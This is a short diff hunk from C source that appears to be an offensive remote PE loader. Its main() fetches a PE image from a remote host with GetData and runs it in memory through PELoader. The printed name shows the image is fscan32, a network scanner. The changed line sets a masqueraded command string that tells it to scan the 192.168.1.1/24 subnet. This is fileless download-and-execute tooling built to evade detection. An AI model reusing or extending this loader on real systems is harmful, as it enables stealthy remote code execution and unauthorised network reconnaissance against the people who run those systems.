@@ -825,7 +825,7 @@ int main(int argc, char** argv) {
     //char* key1 = argv[4];
     DATA PE = GetData(whost, port, wpe);
     printf("fscan32 address is :%p\n the lenght is : %d\n",PE.data,PE.len);
-    sz_masqCmd_Ansi = (char*)"whatEver";
+    sz_masqCmd_Ansi = (char*)"moo_remote_load_pe.exe -h 192.168.1.1/24 -np";
     PELoader((char*)PE.data, PE.len);
     
     /*
